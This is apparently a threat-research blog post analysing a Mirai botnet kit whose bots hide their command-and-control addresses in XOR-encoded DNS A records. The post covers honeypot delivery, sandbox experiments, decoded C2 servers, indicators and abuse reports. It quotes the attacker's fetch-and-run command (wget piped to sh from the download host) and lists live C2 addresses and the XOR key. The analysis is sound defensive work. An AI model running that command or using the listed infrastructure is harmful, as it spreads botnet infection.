# A Mirai kit that hides its C2 addresses in XOR-encoded DNS records

**KSI Digital threat research | 2026-10-10 | observed 2026-10-09/10**

A Mirai kit served from 176.65.139[.]40 doesn't carry its C2 address. Its bots look up two `.gd` domains and treat each A record as an encoded address: XOR it with `E7.70.8E.59` and you get the real server. Run the bot in a sandbox that answers every DNS query with a local address and it just keeps asking, so the C2 never shows up. We worked the key out offline by feeding the bot addresses we chose, then confirmed both decoded servers live. Neither the servers nor the primary domain were on any public feed.

Indicators: [`iocs.csv`](iocs.csv).

## Delivery

On 2026-10-09 at 18:07 UTC, 45.90.163[.]37 logged in to our Cowrie honeypot over telnet as `admin` and piped a script into the shell:

```
wget -O- http://176.65.139[.]40/tot|sh
```

`tot` (`a7c881fd...`, 939 bytes) downloads eleven builds named `jkl<arch>` from the same host (x86, four ARM variants, MIPS, MIPSEL, PowerPC, SuperH, SPARC and m68k) and runs each one with the argument `ssh`. Our honeypot doesn't execute downloads, so we took the x86 build `jklx86` (`55d19b5c...`) and the ARMv7 build `jklarm7` (`61fba4eb...`) from MalwareBazaar, where abuse.ch had already collected them from this host. MalwareBazaar labels the x86 build Mirai. The host itself has been on URLhaus since April 2026.

## What the bot does offline

Our sandbox runs samples with no internet access and answers every DNS query with the router's own private address. In that setting both builds did the same thing:

- they scanned TCP port 23 on random addresses, as Mirai does;
- they looked up `seris[.]gd` over and over (152 queries in 150 seconds for the x86 build, 180 in 180 seconds for the ARM build under emulation) and `myrepis[.]gd` once;
- they never connected to the address the DNS answer gave them.

A bot that resolves its C2 and then refuses the answer usually means the answer isn't used as-is. Most likely the bot throws away the private address it decodes from our sinkhole reply and asks again.

## Working out the encoding

We kept everything offline and changed only the DNS answer. When `seris[.]gd` resolved to 198.51.100.77 (a documentation address that can't be routed), the bot tried to connect to 33.67.234.20. When it resolved to 203.0.113.1, the bot went to 44.112.255.88. Byte by byte, both pairs differ by the same value:

```
198.51.100.77  XOR  E7.70.8E.59  =  33.67.234.20
203.0.113.1    XOR  E7.70.8E.59  =  44.112.255.88
```

The MIPS build (`jklmips`, `708c3628...`, big-endian) gave the same result under emulation: answered 198.51.100.77, it went to 33.67.234.20. So the key doesn't depend on the CPU the bot was built for. The key isn't stored as a four-byte constant in the x86 or ARM build, which fits Mirai's habit of keeping its configuration in an obfuscated table. Each connection attempt also picked a new random port, between about 38000 and 47000 in our runs, so the port isn't part of the record.

## The real records

On 2026-10-10 we resolved both domains through public resolvers (1.1.1.1 and 8.8.8.8). Both zones sit on Cloudflare's nameservers.

| Domain | A record | Decoded |
| --- | --- | --- |
| `seris[.]gd` | 120.49.205[.]109 | 159.65.67[.]52 |
| `seris[.]gd` | 41.205.42[.]92 | 206.189.164[.]5 |
| `myrepis[.]gd` | 87.49.5[.]113 | 176.65.139[.]40 |

The last row is the check that convinced us: the fallback domain decodes to 176.65.139[.]40, the kit's own download server. The published records only make sense through this key. `myrepis[.]gd` has been on ThreatFox as Mirai since December 2025; `seris[.]gd` and both decoded servers weren't on ThreatFox or URLhaus.

## Live confirmation

We then let the x86 build run with real DNS and only the two decoded addresses reachable, TCP ports 1024 to 65535, for a few minutes:

- 01:58 UTC: the bot connected to 159.65.67[.]52 on port 44992. The server completed the handshake and kept the session open for about three minutes while the bot sent a 16-byte keepalive every 30 seconds and a few longer reports. The server never sent anything back except acknowledgements.
- 02:22 UTC: with `seris[.]gd` answering only the second record, the bot connected to 206.189.164[.]5 on port 44559, with the same pattern for about two and a half minutes.

Both are DigitalOcean addresses. We didn't see any commands, so we can't say what the botnet is being used for right now.

## Why it matters

A sandbox that sinkholes DNS, which most do, won't show this kit's C2 at all: the bot never connects to anything but its scan targets. A sandbox with real DNS will show the domain and then a connection to an address that never appears in a DNS answer, and that's easy to misread. Blocking on the domain names works. Blocking on the published A records doesn't, because nothing ever connects to them. For anyone tracking the kit, a change of C2 is a DNS edit, so watching the two domains' records and applying the key gives the current servers without touching the bot.

## Indicators

| Indicator | Role |
| --- | --- |
| `159.65.67[.]52:44992` | C2, confirmed live ([ThreatFox 1959715](https://threatfox.abuse.ch/ioc/1959715/)); the port changes per connection |
| `206.189.164[.]5:44559` | C2, confirmed live ([ThreatFox 1959724](https://threatfox.abuse.ch/ioc/1959724/)); the port changes per connection |
| `seris[.]gd` | primary C2 record, A records XOR `E7.70.8E.59` |
| `myrepis[.]gd` | fallback C2 record, decodes to the download server ([ThreatFox 1678597](https://threatfox.abuse.ch/ioc/1678597/)) |
| `176.65.139[.]40` | download server (`tot`, `jkl<arch>`) |
| `a7c881fdaa4f...` | `tot` installer |
| `55d19b5c6758...`, `61fba4eb0df4...`, `708c36287469...` | `jklx86`, `jklarm7`, `jklmips` bot builds |

## Reporting status

- ThreatFox: 159.65.67[.]52:44992 and 206.189.164[.]5:44559 (botnet_cc, Mirai, confidence 100), KSI Digital 2026-10-10. Our submission of `seris[.]gd` was accepted but ignored by ThreatFox; the decoded servers are the useful indicators anyway.
- DigitalOcean: both servers reported, 2026-10-10.
- Dynadot (registrar of both domains): reported, 2026-10-10. Cloudflare answered that it can't act on domains that only use its DNS.

## Handling

We never ran anything from the attacker's host: the installer was captured passively and the bots came from MalwareBazaar. They ran in an isolated lab whose egress fails closed. The decoding runs were fully offline. For the live runs only the two decoded addresses were reachable, for a few minutes each, and everything else the bot tried, including its telnet scanning, was dropped.

Contact: christophe@ksi-digital.com | abuse.ch `@ksi_digital` | Licensed [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/)
